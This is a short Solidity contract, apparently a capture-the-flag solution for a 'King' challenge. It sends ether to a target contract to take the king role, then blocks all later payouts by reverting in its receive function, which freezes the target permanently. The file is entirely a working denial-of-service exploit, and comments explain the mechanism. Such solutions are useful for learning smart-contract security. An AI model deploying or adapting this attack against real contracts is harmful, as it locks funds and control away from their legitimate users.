// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface IKing {
	function changeOwner(address _owner) external;
}

contract KingHack {
	IKing public challenge;

	constructor(address challengeAddress) {
		challenge = IKing(challengeAddress);
	}

	function attack() external payable {
		(bool success, ) = payable(address(challenge)).call{value: msg.value}("");
		require(success, "External call failed");
	}
	// this is pretty much what makes this attack work
	// you take over the contract with attack
	// making this contract the new king
	// you make the transfer fail, by not allowing the money transfer
	receive() external payable {
		require(false, "I am King forever!");
	}
}